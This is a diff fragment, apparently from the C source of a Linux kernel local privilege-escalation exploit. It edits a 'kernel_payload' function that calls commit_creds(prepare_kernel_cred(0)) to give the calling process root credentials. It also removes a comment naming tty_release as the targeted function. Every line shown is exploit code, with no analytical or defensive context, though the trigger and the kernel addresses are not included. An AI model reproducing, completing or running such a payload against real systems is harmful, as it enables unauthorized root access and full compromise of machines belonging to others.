@@ -63,8 +63,7 @@ void shell(){
 typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
 typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
 
-//target function int tty_release(int fd, int args...)
-int __attribute__((regparm(3))) kernel_payload(int foo) {
+int __attribute__((regparm(3))) kernel_payload() {
   _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
   _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
   commit_creds(prepare_kernel_cred(0));
